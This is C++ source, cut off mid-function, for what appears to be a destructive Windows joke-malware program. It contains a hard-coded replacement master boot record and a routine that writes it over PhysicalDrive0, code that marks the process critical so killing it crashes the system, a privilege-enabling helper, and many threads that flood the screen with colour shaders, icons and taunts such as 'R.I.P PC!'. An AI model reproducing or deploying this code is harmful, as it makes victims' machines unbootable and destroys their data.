#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct {
	FLOAT h, s, l;
} HSL;

namespace Colors {
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}

int stage = 0;
int r = 0, g = 0, b = 0;
COLORREF Hue(int shift) {
	switch (stage) {
	case 0:
		r = 255; b = 0; g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255; b = 0; r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255; r = 0; b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255; r = 0; g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255; g = 0; r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255; g = 0; b > 0 ? b -= shift : stage = 0;
		break;
	}
	return RGB(r, g, b);
}

COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0);
	if (clr == 1) return RGB(0, 255, 0);
	if (clr == 2) return RGB(0, 0, 255);
	if (clr == 3) return RGB(255, 0, 255);
	if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
	srand(GetTickCount());
	WCHAR string[32];
	for (int i = 0; i < 32; i++) {
		string[i] = (WCHAR)(rand() % 256) + 1;
	}
	return string;
}

const unsigned char MasterBootRecord[] = {
	0x31, 0xC0, 0xB9, 0x14, 0x00, 0x50, 0xE2, 0xFD, 0x89, 0xE5, 0xB0, 0x02, 0xCD, 0x10, 0xE4, 0x40,
	0x96, 0xFC, 0xB8, 0x00, 0xB8, 0x8E, 0xD8, 0x8E, 0xC0, 0xE8, 0xF0, 0x00, 0x31, 0xC0, 0x89, 0x46,
	0x04, 0xB1, 0x0F, 0xE8, 0x38, 0x01, 0x8B, 0x7E, 0x04, 0xB8, 0x61, 0x00, 0xF7, 0xE6, 0x83, 0xC0,
	0x17, 0x96, 0x80, 0xE4, 0x03, 0x80, 0xC4, 0x31, 0x88, 0x63, 0x08, 0xB8, 0x08, 0x00, 0x83, 0xFF,
	0x05, 0x72, 0x09, 0xB0, 0x06, 0x83, 0xFF, 0x0D, 0x72, 0x02, 0xB0, 0x04, 0x89, 0x46, 0x06, 0x83,
	0xFF, 0x1F, 0x75, 0x03, 0xE9, 0x88, 0x00, 0xFE, 0x46, 0x04, 0x31, 0xFF, 0x8A, 0x43, 0x08, 0x57,
	0x88, 0x46, 0x02, 0xE8, 0xA6, 0x00, 0x8B, 0x4E, 0x06, 0xE8, 0xF2, 0x00, 0xE8, 0x15, 0x01, 0xC6,
	0x46, 0x02, 0x00, 0xE8, 0x96, 0x00, 0xE8, 0xE3, 0x00, 0x5F, 0x47, 0x3B, 0x7E, 0x04, 0x75, 0xDC,
	0xB4, 0x01, 0xCD, 0x16, 0x74, 0x06, 0xB4, 0x00, 0xCD, 0x16, 0xEB, 0xF4, 0x31, 0xFF, 0xB4, 0x00,
	0xCD, 0x16, 0x3C, 0x1B, 0x74, 0x6F, 0x3C, 0x31, 0x72, 0xF4, 0x3C, 0x35, 0x73, 0xF0, 0x50, 0x57,
	0x88, 0x46, 0x02, 0xE8, 0x66, 0x00, 0x8B, 0x4E, 0x06, 0xE8, 0xB2, 0x00, 0xE8, 0xD5, 0x00, 0xC6,
	0x46, 0x02, 0x00, 0xE8, 0x56, 0x00, 0xE8, 0xA3, 0x00, 0x5F, 0x58, 0x3A, 0x43, 0x08, 0x75, 0x09,
	0x47, 0x3B, 0x7E, 0x04, 0x75, 0xC8, 0xE9, 0x58, 0xFF, 0xB9, 0xF9, 0x6E, 0xE8, 0xA2, 0x00, 0xB1,
	0x1B, 0xE8, 0x8A, 0x00, 0xE8, 0xAD, 0x00, 0xB1, 0x1B, 0xE8, 0x82, 0x00, 0xE9, 0x3D, 0xFF, 0xB0,
	0x32, 0xB9, 0x0E, 0x00, 0x51, 0x50, 0x88, 0x46, 0x02, 0xE8, 0x20, 0x00, 0xB1, 0x02, 0xE8, 0x6D,
	0x00, 0xC6, 0x46, 0x02, 0x00, 0xE8, 0x14, 0x00, 0x58, 0x40, 0x3C, 0x35, 0x75, 0x02, 0xB0, 0x31,
	0x59, 0xE2, 0xE1, 0xEB, 0xC4, 0xB8, 0x02, 0x00, 0xCD, 0x10, 0xCD, 0x20, 0xBF, 0x66, 0x01, 0xBB,
	0x2F, 0x31, 0xB9, 0x39, 0x0B, 0xE8, 0x21, 0x00, 0xBF, 0x92, 0x01, 0xBB, 0x4F, 0x32, 0xB9, 0xFB,
	0x0E, 0xE8, 0x15, 0x00, 0xBF, 0x46, 0x08, 0xBB, 0x6F, 0x33, 0xB9, 0xCC, 0x12, 0xE8, 0x09, 0x00,
	0xBF, 0x72, 0x08, 0xBB, 0x3F, 0x34, 0xB9, 0x72, 0x16, 0xB0, 0x20, 0x3A, 0x7E, 0x02, 0x75, 0x05,
	0xE8, 0x2E, 0x00, 0xB0, 0xB0, 0xB9, 0x0A, 0x00, 0x51, 0x88, 0xDC, 0xB1, 0x14, 0xF3, 0xAB, 0x83,
	0xC7, 0x78, 0x59, 0xE2, 0xF3, 0x88, 0xF8, 0x89, 0x85, 0xF4, 0xFC, 0xC3, 0xB1, 0x01, 0xB5, 0x00,
	0x51, 0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x56, 0x00, 0x74, 0xF7, 0x89, 0x56, 0x00, 0x59, 0xE2, 0xF0,
	0xC3, 0xB0, 0xB6, 0xE6, 0x43, 0x88, 0xC8, 0xE6, 0x42, 0x88, 0xE8, 0xE6, 0x42, 0xE4, 0x61, 0x0C,
	0x03, 0xE6, 0x61, 0xC3, 0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0xC3, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
	0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
	0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
	0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
	0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
	0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
	0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
	0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
	return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));
	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}
	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical() {
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;
	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL) {
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI shader1(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				FLOAT fx = (x - i) ^ (y * i);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI icons(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = 0, y = 0;
		int sel = rand() % 4 + 1;
		double wave = 0, i = 0;
		if (sel == 1) {
			x = 0, y = rand() % h;
			for (; x < w; x += 3) {
				DrawIcon(hdc, x, y + wave * cos(i), LoadIconW(0, MAKEINTRESOURCE(32512 + (rand() % 7))));
				i += 0.05; wave += 0.32;
				Sleep(10);
			}
		}
		else if (sel == 2) {
			x = w, y = rand() % h;
			for (; x > 0; x -= 3) {
				DrawIcon(hdc, x, y + wave * cos(i), LoadIconW(0, MAKEINTRESOURCE(32512 + (rand() % 7))));
				i += 0.05; wave += 0.32;
				Sleep(10);
			}
		}
		else if (sel == 3) {
			x = rand() % w, y = 0;
			for (; y < h; y += 3) {
				DrawIcon(hdc, x + wave * cos(i), y, LoadIconW(0, MAKEINTRESOURCE(32512 + (rand() % 7))));
				i += 0.05; wave += 0.32;
				Sleep(10);
			}
		}
		else if (sel == 4) {
			x = rand() % w, y = h;
			for (; y > 0; y -= 3) {
				DrawIcon(hdc, x + wave * cos(i), y, LoadIconW(0, MAKEINTRESOURCE(32512 + (rand() % 7))));
				i += 0.05; wave += 0.32;
				Sleep(10);
			}
		}
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader2(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int j = 4 * i;
				int fx = (int)(j + (j * sin(y / 16.0)) + j + (j * sin(x / 8.0)) + j + (j * sin((x + y) / 16.0)) + j + (j * sin(sqrt((double)(x * x + y * y)) / 8.0))) / 4;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI triangles(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		TRIVERTEX vtx[3];
		vtx[0].x = rand() % w; vtx[0].y = 0;
		vtx[1].x = 0; vtx[1].y = rand() % h;
		vtx[2].x = rand() % w; vtx[2].y = rand() % h;
		vtx[0].Red = 0; vtx[0].Green = 0; vtx[0].Blue = 0; vtx[0].Alpha = 0xff00;
		vtx[1].Red = 0x7f80; vtx[1].Green = 0; vtx[1].Blue = 0x7f80; vtx[1].Alpha = 0xff00;
		vtx[2].Red = 0xff00; vtx[2].Green = 0; vtx[2].Blue = 0xff00; vtx[2].Alpha = 0xff00;
		GRADIENT_TRIANGLE gt;
		gt.Vertex1 = 0; gt.Vertex2 = 1; gt.Vertex3 = 2;
		GradientFill(hdc, vtx, 4, &gt, 1, GRADIENT_FILL_TRIANGLE);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0x00;
}

DWORD WINAPI shader3(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)((i ^ 4) + (i * 4) * ceil(255));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

struct Point3D {
	float x, y, z;
};

void DrawEllipseAt(HDC hdc, int x, int y, int color) {
	HBRUSH hBrush = CreateSolidBrush(color);
	SelectObject(hdc, hBrush);
	Ellipse(hdc, x - 10, y - 10, x + 20, y + 20);
	DeleteObject(hBrush);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = sin(angleX);
	float cosY = cos(angleY), sinY = sin(angleY);
	float cosZ = cos(angleZ), sinZ = sin(angleZ);
	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y; point.z = z;
	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x; point.z = z;
	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x; point.y = y;
	return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA, float color) {
	Point3D vertices[8] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size},
	};
	POINT screenPoints[8];
	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);
		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;
		DrawEllipseAt(hdc, screenX, screenY, color);
	}
	POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
	Polyline(hdc, polyline1, 5);
	POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
	Polyline(hdc, polyline2, 5);
	POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};
	Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);
}

DWORD WINAPI cube(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int wdpi = GetDeviceCaps(hdc, 88);
	int hdpi = GetDeviceCaps(hdc, 90);
	ReleaseDC(0, hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int x = w * wdpi / 96;
	int y = h * hdpi / 96;
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	float x2 = 100.0;
	float y2 = 100.0;
	float angleX = 0.0, angleY = 0.0, angleZ = 0.0;
	float angleIncrement = 0.04;
	float colorA = 0;
	float size = 100;
	while (true) {
		hdc = GetDC(0);
		x2 += incrementor * signX;
		y2 += incrementor * signY;
		if (x2 + 75 >= x) {
			signX = -1; x2 = x - 76;
		}
		else if (x2 <= 75) {
			signX = 1; x2 = 76;
		}
		if (y2 + 75 >= y) {
			signY = -1; y2 = y - 76;
		}
		else if (y2 <= 75) {
			signY = 1; y2 = 76;
		}
		Point3D center = { x2, y2, 0.0f };
		int color = Hue(3);
		HPEN hPen = CreatePen(0, 8, color);
		SelectObject(hdc, hPen);
		Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA, color);
		ReleaseDC(0, hdc);
		DeleteObject(hPen);
		DeleteDC(hdc);
		angleX += angleIncrement;
		angleY += angleIncrement;
		angleZ += angleIncrement;
		Sleep(10);
		colorA += 1;
		if (size >= 0 && size <= 100) {
			size += 0.5;
		}
	}
	return 0;
}

DWORD WINAPI shader4(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh, t = y ^ y | x;
			rgbtriple[i].rgbtRed += GetRValue(x - y);
			rgbtriple[i].rgbtGreen += GetGValue(x - i);
			rgbtriple[i].rgbtBlue += GetBValue(t - i);
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
	}
}

DWORD WINAPI rectz(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH hbsh = CreateSolidBrush(Hue(3));
		SelectObject(hdc, hbsh);
		BitBlt(hdc, rand() % (w - 0), rand() % (h - 0), rand() % (w - 0), rand() % (h - 0), hdc, rand() % (w - 0), rand() % (h - 0), PATCOPY);
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI icons1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int cx = rand() % w, cy = rand() % h;
		int rad = 10;
		for (int t = 0; t < cx + cy; t++) {
			int x = (int)(float)(rad + t * tan(t + rad * 3) + cx);
			int y = (int)(float)(rad + t * cos(t + rad * 3) + cy);
			DrawIcon(hdc, x, y, LoadIcon(0, MAKEINTRESOURCE(32512 + (rand() % 7))));
		}
		ReleaseDC(0, hdc);
		Sleep(500);
	}
}

DWORD WINAPI shader5(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				FLOAT fx = ((x - i) ^ (y - i)) + y;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI cur1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		LPCWSTR lpCursors[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
		int CursorCount = rand() % 16;
		DrawIconEx(hdc, rand() % sw, rand() % sh, LoadCursor(0, lpCursors[CursorCount]), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI patshake(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RndRGB());
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		BitBlt(hdc, rand() % 2 == 0 ? -5 : 5, rand() % 2 == 0 ? -5 : 5, w, h, hdc, 0, 0, SRCCOPY);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI textout(LPVOID lpvd) {
	while (true) {
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		LPCSTR things[] = {
			"jdwkfiekgi", "AMOGUS!", "N17Pro3426", "enjoy your new PC!",
			"there's no mercy!", "is this Ohio?!", "what is happening?!",
			"R.I.P PC!", "system overloaded!"
		};
		int thing = rand() % _countof(things);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI shader6(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
